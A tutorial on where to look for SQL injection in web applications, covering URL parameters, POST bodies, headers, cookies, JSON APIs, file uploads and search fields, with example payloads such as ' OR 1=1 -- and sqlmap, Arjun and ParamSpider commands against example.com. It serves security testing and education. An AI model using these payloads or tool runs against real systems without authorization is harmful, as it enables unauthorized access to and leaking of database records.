# Common Places to Find SQL Injection (SQLi) Vulnerabilities

SQL Injection (SQLi) is a web security vulnerability that allows attackers to interfere with the queries an application makes to its database. This can lead to unauthorized access, data leaks, modification, or even deletion of database records.

SQLi vulnerabilities often appear in applications that interact with databases using user-supplied inputs. Some common places where SQLi can occur include:

## **1) GET Parameters**

**Description**: GET parameters are passed in the URL after a `?` symbol. They are commonly used for filtering, sorting, or retrieving specific data.

**Example**:
```bash
https://example.com/page?id=1
```

**How SQLi Occurs**: An attacker can inject malicious SQL if the `id` parameter is directly used in a SQL query without proper sanitization.

**Testing**: Append SQLi payloads to the parameter.
```bash
https://example.com/page?id=1' OR 1 = 1 -- -
```
If the application is vulnerable, it may return all rows from the database.

**Tools for Finding:**

- **ParamSpider**: Extracts parameters from URLs.
  ```bash
  python3 paramspider.py -d example.com
  ```
  Tool Link: [ParamSpider](https://github.com/devanshbatham/ParamSpider.git)

- **Arjun**: Fast parameter discovery tool.
  ```bash
  arjun -u https://example.com/page?id=1
  ```
  Tool Link: [Arjun](https://github.com/s0md3v/Arjun.git)

- **Burp Suite**: Use the Param Miner extension to guess parameters.

**Tools for Testing:**

- **Manual Testing**: Use browser or curl.
- **Automated Testing**: Use sqlmap.
  ```bash
  sqlmap -u https://example.com/page?id=1
  ```

---

## **2) POST Parameters**

**Description**: POST parameters are sent in the body of an HTTP request, typically in forms (e.g., login, registration).

**Example**:
```bash
POST /login HTTP/1.1
Content-Type: application/x-www-form-urlencoded
username=admin' OR '1'='1&password=password
```

**How SQLi Occurs**: If the input fields are not sanitized, an attacker can inject SQL queries.

**Testing:**

- Use tools like Burp Suite to intercept the request.
- Inject payloads like `' OR '1'='1` into the username or password fields.

**Tools for Finding:**

- **Burp Suite**: Intercept and analyze POST requests.
- **Arjun**: Can also discover POST parameters.
  ```bash
  arjun -u https://example.com/login --data="username=admin&password=password"
  ```

**Tools for Testing:**

- **Burp Suite**: Intercept and modify POST requests.
- **sqlmap**: Test POST requests.
  ```bash
  sqlmap -u https://example.com/login --data="username=admin&password=password"
  ```

---

## **3) Headers**

**Description**: HTTP headers like Cookie, User-Agent, and Referer can be exploited if they are used in SQL queries.

**Example**:
```bash
Cookie: session_id=12345
```

**How SQLi Occurs**: If the `session_id` is used in a SQL query without sanitization, an attacker can inject malicious SQL.

**Testing:**

- Use Burp Suite to modify headers. Inject payloads like `' OR 1=1 --` into headers.
- Example:
  ```bash
  GET /dashboard HTTP/1.1
  Host: example.com
  Cookie: session_id=12345' OR 1=1 --
  ```

**Tools for Finding:**

- **Burp Suite**: Use the Param Miner extension to guess headers.
- **Arjun**: Can also test headers for parameters.

**Tools for Testing:**

- **Burp Suite**: Modify headers and test for vulnerabilities.
- **sqlmap**: Test headers.
  ```bash
  sqlmap -u https://example.com/dashboard --headers="Cookie:session_id=12345"
  ```

---

## **4) Cookies**

**Description**: Cookies are small pieces of data stored in the browser and sent with every request to the server.

**Example**:
```bash
Cookie: user_id=12345
```

**How SQLi Occurs**: If the `user_id` is used in a SQL query, an attacker can manipulate it.

**Testing:**

- Modify cookies using browser dev tools or Burp Suite.
- Inject payloads like `' OR '1'='1`.
- Example:
  ```bash
  GET /profile HTTP/1.1
  Host: example.com
  Cookie: user_id=12345' OR '1'='1
  ```

**Tools for Finding:**

- **Burp Suite**: Intercept and analyze cookies.
- **Cookie Editor**: Browser extension to modify cookies.

**Tools for Testing:**

- **Burp Suite**: Intercept and modify cookies.
- **sqlmap**: Test cookies.
  ```bash
  sqlmap -u https://example.com/profile --cookie="user_id=12345"
  ```

---

## **5) JSON/API Endpoints**

**Description**: APIs often accept JSON payloads, which can be exploited if not properly sanitized.

**Example**:
```json
{"username":"admin", "password":"password"}
```

**How SQLi Occurs**: If the JSON input is used directly in SQL queries, an attacker can inject malicious SQL.

**Testing:**

- Use tools like Burp Suite or Postman to send JSON payloads.
- Inject payloads like `' OR 1=1 --` into JSON fields.

**Tools for Finding:**

- **Burp Suite**: Intercept and analyze JSON payloads.
- **Postman**: Manually test API endpoints.

**Tools for Testing:**

- **Burp Suite**: Intercept and modify JSON payloads.
- **sqlmap**: Test JSON endpoints.
  ```bash
  sqlmap -u https://example.com/api/login --data='{"username":"admin", "password":"password"}'
  ```

---

## **6) File Upload**

**Description**: File upload features may use filenames or metadata in SQL queries.

**Example**:
```bash
Uploading a file named test'.jpg
```

**How SQLi Occurs**: An attacker can inject malicious SQL if the filename is used in a SQL query.

**Tools for Finding:**

- **Burp Suite**: Intercept file upload requests.
- **OWASP ZAP**: Analyze file upload functionality.

**Tools for Testing:**

- **Burp Suite**: Intercept and modify file upload requests.

---

## **7) Search Fields**

**Description**: Search bars or filters often process user input and use it in SQL queries.

**Example**:
```bash
test' OR 1=1 --
```

**How SQLi Occurs**: If the search term is not sanitized, an attacker can inject SQL.

**Tools for Finding:**

- **Burp Suite**: Intercept and analyze search requests.
- **Arjun**: Can discover parameters in search fields.

**Tools for Testing:**

- **sqlmap**: Test search fields.

---



